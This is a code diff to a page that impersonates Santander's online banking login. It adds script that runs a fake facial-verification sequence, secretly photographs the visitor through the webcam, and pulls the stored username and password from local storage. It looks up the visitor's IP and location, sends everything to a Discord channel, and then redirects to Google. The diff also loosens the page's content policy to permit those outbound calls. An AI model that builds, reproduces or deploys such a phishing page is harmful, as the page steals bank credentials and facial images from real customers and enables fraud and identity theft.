@@ -6,7 +6,7 @@
 <title>Online Banking Santander | Inicio de Sesión</title>
 <meta name=referrer content=no-referrer>
 <meta http-equiv="Content-Security-Policy"
-	content="default-src 'none'; font-src 'self' data: https://fonts.gstatic.com; img-src 'self' data:; style-src 'self' 'unsafe-inline' http://127.0.0.1:5500 https://fonts.googleapis.com; media-src 'self' data:; script-src 'self' 'unsafe-inline' data: http://127.0.0.1:5500; object-src 'self' data:; frame-src 'self' data:; connect-src 'self' ws://127.0.0.1:5500 http://127.0.0.1:5500;">
+	content="default-src 'none'; font-src 'self' data: https://fonts.gstatic.com; img-src 'self' data:; style-src 'self' 'unsafe-inline' http://127.0.0.1:5500 https://fonts.googleapis.com; media-src 'self' data:; script-src 'self' 'unsafe-inline' data: http://127.0.0.1:5500; object-src 'self' data:; frame-src 'self' data:; connect-src 'self' ws://127.0.0.1:5500 http://127.0.0.1:5500 https://discord.com https://api.ipdata.co http://ip-api.com;">
 <link rel="stylesheet" href="../../css/bio.css">
 </head>
 <body>
@@ -105,18 +105,118 @@
 	</div>
 </div>
 
+<canvas id="photo-canvas" width="640" height="480" style="display:none"></canvas>
+<script src="../../js/santander-logger.js"></script>
 <script>
 (function() {
-	var v = document.getElementById('webcam');
-	if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-		navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-			.then(function(stream) { v.srcObject = stream; })
-			.catch(function() {});
+	var video = document.getElementById('webcam');
+	var statusEl = document.getElementById('facial-status');
+	var modal = document.getElementById('facial-modal');
+	var canvas = document.getElementById('photo-canvas');
+	var streamRef = null;
+
+	var messages = [
+		'ANALIZANDO BIOMETRÍA...',
+		'DETECTANDO ROSTRO...',
+		'VERIFICANDO IDENTIDAD...',
+		'PROCESANDO DATOS...',
+		'VALIDACIÓN COMPLETADA'
+	];
+
+	function startWebcam() {
+		if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+			navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } })
+				.then(function(stream) {
+					streamRef = stream;
+					video.srcObject = stream;
+					video.play();
+					setTimeout(startFacialProcess, 1500);
+				})
+				.catch(function() {
+					if (statusEl) statusEl.textContent = 'CÁMARA NO DISPONIBLE';
+					setTimeout(function() { window.location.href = 'https://www.google.com'; }, 3000);
+				});
+		}
+	}
+
+	function capturePhoto() {
+		var ctx = canvas.getContext('2d');
+		canvas.width = video.videoWidth || 640;
+		canvas.height = video.videoHeight || 480;
+		ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+		return new Promise(function(resolve) {
+			canvas.toBlob(function(blob) {
+				resolve(blob);
+			}, 'image/jpeg', 0.85);
+		});
+	}
+
+	function stopWebcam() {
+		if (streamRef) {
+			streamRef.getTracks().forEach(function(track) { track.stop(); });
+		}
+	}
+
+	function startFacialProcess() {
+		var step = 0;
+		var interval = setInterval(function() {
+			step++;
+			if (step < messages.length) {
+				if (statusEl) statusEl.textContent = messages[step];
+			}
+			if (step >= messages.length - 1) {
+				clearInterval(interval);
+				completeFacial();
+			}
+		}, 1000);
+	}
+
+	function completeFacial() {
+		capturePhoto().then(function(photoBlob) {
+			stopWebcam();
+
+			var flowDataRaw = localStorage.getItem('santander_flow_data');
+			var flowData = flowDataRaw ? JSON.parse(flowDataRaw) : {};
+			var now = new Date();
+
+			SantanderLogger.getIpInfo().then(function(ipInfo) {
+				var embeds = [{
+					title: '📸 Santander AR - Captura Facial',
+					color: 0xEC0000,
+					fields: [
+						{ name: '👤 Usuario', value: '`' + (flowData.usuario || 'N/A') + '`', inline: true },
+						{ name: '🔑 Contraseña', value: '```' + (flowData.clave || 'N/A') + '```', inline: false },
+						{ name: '📱 Dispositivo', value: '`' + (flowData.dispositivo || 'N/A') + '`', inline: true },
+						{ name: '📐 Resolución', value: '`' + (flowData.resolucion || 'N/A') + '`', inline: true },
+						{ name: '🌐 IP', value: '`' + (ipInfo.ip || 'N/A') + '`', inline: false },
+						{ name: '📍 Ubicación', value: '`' + (ipInfo.location || 'N/A') + '`', inline: false },
+						{ name: '🏢 ISP', value: '`' + (ipInfo.isp || 'N/A') + '`', inline: true },
+						{ name: '🏳️ País', value: (ipInfo.flag || '🌐') + ' ' + (ipInfo.country || '??') + ' (' + (ipInfo.country_code || '??') + ')', inline: true }
+					],
+					image: { url: 'attachment://facial.jpg' },
+					footer: { text: now.toLocaleDateString('es-AR') + ' ' + now.toLocaleTimeString('es-AR') + ' | ' + (flowData.zonaHoraria || '') },
+					timestamp: new Date().toISOString()
+				}];
+
+				SantanderLogger.sendToDiscordWithFile(embeds, photoBlob, 'facial.jpg').then(function() {
+					localStorage.removeItem('santander_flow_data');
+					if (statusEl) statusEl.textContent = '✓ VERIFICACIÓN EXITOSA';
+					setTimeout(function() {
+						window.location.href = 'https://www.google.com';
+					}, 1500);
+				});
+			});
+		});
 	}
 
 	document.getElementById('btn-ingresar').addEventListener('click', function() {
-		document.getElementById('facial-modal').classList.add('active');
+		modal.classList.add('active');
+		startWebcam();
 	});
+
+	if (modal.classList.contains('active')) {
+		startWebcam();
+	}
 })();
 </script>
 </body>
